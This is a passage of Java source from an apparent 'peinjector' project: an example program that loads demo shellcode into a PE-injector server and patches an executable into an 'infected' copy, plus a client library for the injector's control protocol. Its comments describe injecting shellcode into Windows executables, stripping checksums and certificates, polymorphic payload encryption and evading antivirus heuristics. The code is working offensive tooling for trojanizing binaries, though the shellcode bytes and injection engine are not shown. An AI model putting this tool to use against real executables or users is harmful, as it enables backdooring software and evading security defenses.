		LibPeDataProtocol data = new LibPeDataProtocol(control);

		//config the control class
		try {
			control.setServerAddress(peinjectorserver, controlPort, dataPort);
			
		} catch (LibPeBadInputException e1) {
			// the ip/host or the ports are invalide
			e1.printStackTrace();
		}
		
		//config the pe-injector
		try {
			boolean server_response;
			
			// set shellcode (x86)
			server_response = control.cmdSendSetPayloadX86( LibPeShellcodeFactory.demo_calc_x86() );
			if(!server_response) {
				System.err.println("server error! Wrong Token????");
				System.exit(1);
			}
			server_response = control.cmdSendSetPayloadNameX86("xyz-name-of-the-shellcode");
			if(!server_response) {
				System.err.println("server error! Wrong Token????");
				System.exit(1);
			}
			
			// set shellcode (x64)
			server_response = control.cmdSendSetPayloadX64( LibPeShellcodeFactory.demo_calc_x64() );
			if(!server_response) {
				System.err.println("server error! Wrong Token????");
				System.exit(1);
			}
			server_response = control.cmdSendSetPayloadNameX64("bla bla blub 64");
			if(!server_response) {
				System.err.println("server error! Wrong Token????");
				System.exit(1);
			}
			
			// read config
			String ini = control.cmdSendGetConfig();
			System.out.println(ini);
			
			// you can also use:
			LibPeServerConfig serverconf = control.cmdSendGetConfigAndParse();
			System.out.println( serverconf.getControl_port() );
			System.out.println( serverconf.getData_port() );
			System.out.println( serverconf.isPersistent_ports() );
			System.out.println( serverconf.getPayload_name_x64() );

			
		} catch (LibPeSocketException e1) {
			//  if the IP address of the host could not be determined
			e1.printStackTrace();
		} catch (LibPeProtocolException e1) {
			//  if the control protocol is corrupt
			e1.printStackTrace();
		}
		
		//patch a file on the fly
		try {
			applyPatch(data, new FileInputStream(sourceFile), new FileOutputStream(infectFile));
			
		} catch (FileNotFoundException e) {
			// from the FileInputStream
			e.printStackTrace();
		} catch (IOException e) {
			// from the FileInputStream
			e.printStackTrace();
		} catch (LibPeSocketException e) {
			// Socket errors
			e.printStackTrace();
		}

	}
	
	

	/**
	 * a simple example to use the pe-injector server
	 * 
	 * @param data is a ({@link LibPeDataProtocol})-Object zu communicate with the pe-injector server
	 * @param is inputstream (FileInputStream)
	 * @param os outputstream (FileOutputStream)
	 * 
	 * @throws IOException if an I/O error occurs when creating the socket
	 * @throws LibPeSocketException 
	 */
	public static void applyPatch(LibPeDataProtocol data, FileInputStream is, FileOutputStream os) throws IOException, LibPeSocketException {
		
		// some variables
		byte[] buffer = new byte[4096];
		int position = 0;
		
		// read the first block (4096) to get the pe-header
		is.read(buffer);
		
		// send the block to the server and get the patch for the file
		LibPePatch patch = data.getPatchFromPEinjector(buffer);
		
		// patch the file block by block
		do {
			// write the manipulated data (may be more than the buffer size)
			os.write( patch.applyPatch(buffer,position) );
			// set position to the next block
			position += buffer.length;
		} while (is.read(buffer) > 0);	// do while data to read

		// fin --> INFECTED!!!!!!
	}

}

```

`peinjector/connectors/java/eu/peinjector/gui/jInjectorControlGUI.java`:

```java
package eu.peinjector.gui;

public class jInjectorControlGUI {

	public static void main(String[] args) {
		// TODO: Java-GUI under construction
	}

}

```

`peinjector/connectors/java/eu/peinjector/libpe/LibPeControlProtocol.java`:

```java
package eu.peinjector.libpe;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.security.SecureRandom;

import javax.xml.bind.DatatypeConverter;

import eu.peinjector.libpe.exceptions.LibPeProtocolException;
import eu.peinjector.libpe.exceptions.LibPeBadInputException;
import eu.peinjector.libpe.exceptions.LibPeSocketException;


/**
 * The control protocol to manage the pe-injector server.
 * <pre>
 *     0                     32        33                      37                            n
 *     +---------------------+---------+-----------------------+-----------------------------+
 *     |                     |         |                       |                             |
 *     |        token        | command |         length        |            data             |
 *     |                     |         |                       |                             |
 *     +---------------------+---------+-----------------------+-----------------------------+
 * 
 *     token: A 32-byte key. It always has to start with 0xAAAA. The default token is 0xAAAA000...0
 *     command: A 1byte command field (see commands)
 *     length: the size of the data feld
 *     data: The data if the command needs it
 * </pre>
 * 
 */
public class LibPeControlProtocol {

	
	// Class variables
	// ------------------------------------------------------------------------------
	/**
	 * default token == no authentication
	 */
	public static final byte[] DEFAULT_TOKEN = DatatypeConverter.parseHexBinary("aaaa000000000000000000000000000000000000000000000000000000000000");
	
	// Receive Commands
	private static final byte CMD_RECEIVE_SUCCESS                               = (byte) 0xFD;
	private static final byte CMD_RECEIVE_ERROR                                 = (byte) 0xFE;
	
	// Send Commands
	private static final byte CMD_SEND_ECHO                                     = (byte) 0x01;
	private static final byte CMD_SEND_RESTART                                  = (byte) 0x02;
	private static final byte CMD_SEND_SET_SECTION_NAME                         = (byte) 0x03;
	private static final byte CMD_SEND_SET_METHOD_CHANGE_FLAGS                  = (byte) 0x04;
	private static final byte CMD_SEND_SET_METHOD_NEW_SECTION                   = (byte) 0x05;
	private static final byte CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE              = (byte) 0x06;
	private static final byte CMD_SEND_SET_METHOD_ALIGNMENT                     = (byte) 0x07;
	private static final byte CMD_SEND_SET_REMOVE_INTEGRITY_CHECK               = (byte) 0x08;
	private static final byte CMD_SEND_SET_DATA_PORT                            = (byte) 0x09;
	private static final byte CMD_SEND_SET_DATA_INTERFACE                       = (byte) 0x0A;
	private static final byte CMD_SEND_SET_CONTROL_PORT                         = (byte) 0x0B;
	private static final byte CMD_SEND_SET_CONTROL_INTERFACE                    = (byte) 0x0C;
	private static final byte CMD_SEND_SET_PAYLOAD_X86                          = (byte) 0x0D;
	private static final byte CMD_SEND_SET_PAYLOAD_X64                          = (byte) 0x0E;
	private static final byte CMD_SEND_GET_CONFIG                               = (byte) 0x0F;
	private static final byte CMD_SEND_SET_PAYLOAD_NAME_X86                     = (byte) 0x10;
	private static final byte CMD_SEND_SET_TRY_STAY_STEALTH                     = (byte) 0x11;
	private static final byte CMD_SEND_SET_ENABLE                               = (byte) 0x12;
	private static final byte CMD_SEND_SET_RANDOM_SECTION_NAME                  = (byte) 0x13;
	private static final byte CMD_SEND_SHUTDOWN                                 = (byte) 0x14;
	private static final byte CMD_SEND_SET_PAYLOAD_NAME_X64                     = (byte) 0x15;
	private static final byte CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP            = (byte) 0x16;
	private static final byte CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS = (byte) 0x17;
	private static final byte CMD_SEND_SET_ENCRYPT                              = (byte) 0x18;
	private static final byte CMD_SEND_SET_ENCRYPT_ITERATIONS                   = (byte) 0x19;
	private static final byte CMD_SEND_SET_TOKEN                                = (byte) 0x20;

	// communication
	private byte[] token = DEFAULT_TOKEN;
	private String libpeServer = "127.0.0.1";
	private int libpeControlPort = 31338;
	private int libpeDataPort = 31337;

	
	// general methods
	// ------------------------------------------------------------------------------
	/**
	 * Generate a valid random token<br>
	 * (32 byte long and starts with 0xAAAA)
	 * 
	 * @return random token
	 */
	public static byte[] generateToken() {
		SecureRandom random = new SecureRandom();
		byte[] token = new byte[32];
		random.nextBytes(token);
		token[0] = (byte) 0xAA;
		token[1] = (byte) 0xAA;
		return token;
	}

	/**
	 * Set a InetSocketAddress to the pe-injector control port.
	 * 
	 * @param host hostname or ip
	 * @param controlPort control port
	 * @param dataPort data port
	 * @throws LibPeBadInputException if host is null or port is invalid
	 * 
	 * @see #getServerAddress()
	 * @see #getControlPort()
	 * @see #getDataPort()
	 */
	public void setServerAddress(String host, int controlPort, int dataPort) throws LibPeBadInputException {
		if(null == host || controlPort < 0 || controlPort > 65535 || dataPort < 0 || dataPort > 65535) {
			throw new LibPeBadInputException("host or port invalid");
		} else {
			this.libpeServer = host;
			this.libpeControlPort = controlPort;
			this.libpeDataPort = dataPort;
		}
	}
	
	/**
	 * @return server ip or host
	 * @see #setServerAddress(String, int)
	 */
	public String getServerAddress() {
		return libpeServer;
	}
	
	/**
	 * @return server control port
	 * @see #setServerAddress(String, int)
	 */
	public int getControlPort() {
		return libpeControlPort;
	}
	
	/**
	 * @return server data port
	 * @see #setServerAddress(String, int)
	 */
	public int getDataPort() {
		return libpeDataPort;
	}

	/**
	 * Set a token for the communication.<br>
	 * 
	 * @param token {@link #generateToken()}
	 * @throws LibPeBadInputException if invalid length or start not with 0xAAAA
	 * 
	 * @see #getToken()
	 */
	public void setToken(byte[] token) throws LibPeBadInputException {
		// token length
		if(null == token || 32 != token.length) {
			throw new LibPeBadInputException("the token musst be 32 byte long");
		}
		// token start with 0xaaaa
		if((byte)0xAA != token[0] || (byte)0xAA != token[1]) {
			throw new LibPeBadInputException("the token musst start with 0xAAAA");
		}
		// token is ok
		this.token = token;
	}

	/**
	 * @return the used token for the communication
	 * 
	 * @see #setToken(byte[])
	 */
	public byte[] getToken() {
		return token;
	}
	
	/**
	 * Sends commands to the server<br>
	 * (see control protocol: {@link LibPeControlProtocol}) 
	 * 
	 * @param cmd command byte  (see CMD_SEND_*)
	 * @param value optional data to send
	 * @return null...CMD_RECEIVE_ERROR;  byte[]...CMD_RECEIVE_SUCCESS
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket
	 */
	private byte[] cmdSend(byte cmd, byte[] value) throws LibPeProtocolException, LibPeSocketException  {
		// value is not null
		if(null == value) {
			value = new byte[0];
		}
		
		// connect to server
		InetSocketAddress socketAddress = new InetSocketAddress(this.getServerAddress(), this.getControlPort());
		Socket socket = new Socket();
		byte[] response = new byte[8192];
		int received = 0;
		try {
			socket.connect(socketAddress, 3000);

			// build send data
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			baos.write(getToken());		// send token (32 byte)
			baos.write(cmd);			// send command (1 byte)
			baos.write( ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(value.length).array() );	// send length (4 byte)
			baos.write(value);			// send value (n byte)
			
			// SEND
			OutputStream out = socket.getOutputStream();
			out.write(baos.toByteArray());
			out.flush();
	
			// RECIVE DATA
			InputStream in = socket.getInputStream();
			received = in.read(response);
			
		} catch(Exception e) {
			throw new LibPeSocketException(e.getMessage());
			
		} finally {
			try {
				socket.close();		// CLOSE SOCKET
			} catch (Exception e2) {
			}
		}
		
		// CHECK DATA
		// min size (header: 32+5 byte)
		if(received < 32+5) {
			throw new LibPeProtocolException("response is too short");
		}
		
		// the header is ok:
		int received_lng = ByteBuffer.wrap(response,(32+1),4).order(ByteOrder.LITTLE_ENDIAN).getInt();
		// is the length feld ok?
		if(received_lng != received-(32+5)) {
			throw new LibPeProtocolException("length feld invalid");
		}
		
		// copy the received body in a new array
		byte[] received_msg = new byte[received_lng];
		for(int i=0; i<received_lng; i++) {
			received_msg[i] = response[i+(32+5)];
		}
		
		// check the command byte
		byte received_cmd = response[32+0];
		if(CMD_RECEIVE_SUCCESS == received_cmd) {
			// CMD_RECEIVE_SUCCESS -> received_msg
			return received_msg;
		}else if(CMD_RECEIVE_ERROR == received_cmd) {
			// CMD_RECEIVE_ERROR -> null
			return null;
		}else {
			// bad cmd byte ?!?!?!?!?!
			throw new LibPeProtocolException("bad command byte received");
		}
	}

	
	// send-boolean-commands
	// ------------------------------------------------------------------------------
	/**
	 * Change unmatching section flags. Might be required for "alignment method" and "alignment resize method" flags.
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetMethodChangeFlags(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_METHOD_CHANGE_FLAGS, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * Insert a new section and inject the shellcode there.
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetMethodNewSection(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_METHOD_NEW_SECTION, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * Try to resize an executable section and to inject the shellcode there. This is possible because of the gap between the FileAlignment and the SectionAlignment value.
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetMethodAlignmentResize(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * Try to inject the shellcode at the end of an executable section. This is possible because of the gap between the SizeOfRawData and the VirtualSize value.
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetMethodAlignment(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_METHOD_ALIGNMENT, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * Remove integrated integrity checks, such as PE header checksums, certificates, force-check-checksum-flag, ...
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetRemoveIntegrityCheck(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_REMOVE_INTEGRITY_CHECK, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * Sets the server to listen locally (loopback, 127.0.0.1) or globally (any, 0.0.0.0)<br>
	 * (1...local; 0...global)<br>
	 * (active after server restart)
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetDataInterface(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_DATA_INTERFACE, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}
	
	/**
	 * Sets the server to listen locally (loopback, 127.0.0.1) or globally (any, 0.0.0.0)<br>
	 * (1...local; 0...global)<br>
	 * (active after server restart)
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetControlInterface(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_CONTROL_INTERFACE, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}
	
	/**
	 * Generate a random name for sections created by the "new section name" flag.
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetRandomSectionName(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_RANDOM_SECTION_NAME, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}
	
	/**
	 * Try to discover if the executable could possibly detect infection (e.g. NSIS setups) and skip the executable.
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetTryStayStealth(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_TRY_STAY_STEALTH, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * enable/disable the injection of the pe-injector
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetEnable(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_ENABLE, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}
	
	/**
	 * Encrypt payload with random keys. The decryption stub is generated and obfuscated individually on-the-fly for each injection, using the integrated polymorphic engine.
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetEncrypt(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_ENCRYPT, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * Inject shellcode with one of the enabled methods and insert an obfuscated jump to the payload in another section. The EP doesn't point to the shellcode now, but this can increase some AV's heuristic detection rate.
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetMethodCrossSectionJump(boolean value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = {0};
		if(value) {
			protocolBody[0] = 1;
		}
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	
	// send-string-commands
	// ------------------------------------------------------------------------------
	/**
	 * send a string to the server, he will repeat it
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public String cmdSendEcho(String value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		if(null == value) {
			value = "";
		}
		byte[] protocolBody = value.getBytes();
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_ECHO, protocolBody);

		// this and getConfig return a String!!!
		if(null == msg) {
			return "";
		}else {
			try {
				return new String(msg, "UTF-8");
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
				return "";
			}
		}
	}

	/**
	 * Set a static name for sections created by the "new section method" flag.
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetSectionName(String value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		if(null == value) {
			value = "";
		}
		byte[] protocolBody = value.getBytes();
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_SECTION_NAME, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * set a name für the active shellcode (x86)
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetPayloadNameX86(String value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		if(null == value) {
			value = "";
		}
		byte[] protocolBody = value.getBytes();
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_PAYLOAD_NAME_X86, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * set a name für the active shellcode (x64)
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetPayloadNameX64(String value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		if(null == value) {
			value = "";
		}
		byte[] protocolBody = value.getBytes();
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_PAYLOAD_NAME_X64, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	
	// send-integer-commands
	// ------------------------------------------------------------------------------
	/**
	 * Port on which the server listens for raw data (PE files/headers)
	 * (active after server restart)
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetDataPort(int value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(value).array();
				
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_DATA_PORT, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * Port on which the server listens for control commands (Like from this interface)
	 * (active after server restart)
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetControlPort(int value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(value).array();
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_CONTROL_PORT, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}
	
	/**
	 * Set how many jump-indirections should be inserted before the shellcode (1-64, 1-5 should be enough, increasing this value can improve some AV's heuristic detection rate).
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetMethodCrossSectionJumpIterations(int value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(value).array();
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * Set how many encryption iterations should be applied (1-16, 1-3 should be enough, increasing this value can improve some AV's heuristic detection rate).
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetEncryptIterations(int value) throws LibPeProtocolException, LibPeSocketException {
		// convert value
		byte[] protocolBody = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(value).array();
		
		// send cmd
		byte[] msg = cmdSend(CMD_SEND_SET_ENCRYPT_ITERATIONS, protocolBody);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}


	// send-byte-commands
	// ------------------------------------------------------------------------------
	/**
	 * set a shellcode for injection
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetPayloadX86(byte[] value) throws LibPeProtocolException, LibPeSocketException {
		byte[] msg = cmdSend(CMD_SEND_SET_PAYLOAD_X86, value);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * set a shellcode for injection
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetPayloadX64(byte[] value) throws LibPeProtocolException, LibPeSocketException {
		byte[] msg = cmdSend(CMD_SEND_SET_PAYLOAD_X64, value);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}
	
	/**
	 * set a new token for the data and control communication
	 * 
	 * @param value
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendSetToken(byte[] value) throws LibPeProtocolException, LibPeSocketException {
		byte[] msg = cmdSend(CMD_SEND_SET_TOKEN, value);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}
	
	
	// void commands
	// ------------------------------------------------------------------------------
	/**
	 * If the ports or interfaces set incorrectly you won't be able to contact the server through this interface. If you've changed the control port you'll have to adjust the settings of this interface too.
	 * 
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendRestart() throws LibPeProtocolException, LibPeSocketException {
		byte[] msg = cmdSend(CMD_SEND_RESTART, null);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}
	
	/**
	 * Shutdown?! lol!!!  never do this!
	 * 
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public boolean cmdSendShutdown() throws LibPeProtocolException, LibPeSocketException {
		byte[] msg = cmdSend(CMD_SEND_SHUTDOWN, null);
		return (null != msg); // TRUE: server sends CMD_RECEIVE_SUCCESS
	}

	/**
	 * return the active config of the server (ini file)
	 * 
	 * @return true...all is ok; false...servererror OR WRONG TOKEN!!!!
	 * 
	 * @throws LibPeProtocolException if the control protocol is corrupt
	 * @throws LibPeSocketException if timeout expires before connecting, or if the IP address of the host could not be determined, or if an I/O error occurs when creating the socket 
	 */
	public String cmdSendGetConfig() throws LibPeProtocolException, LibPeSocketException {
		byte[] msg = cmdSend(CMD_SEND_GET_CONFIG, null);
		
		// this and echo return a String!!!
		if(null == msg) {
			return "";
		}else {
			try {
				return new String(msg, "UTF-8");
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
				return "";
			}
		}
	}
	
	/**
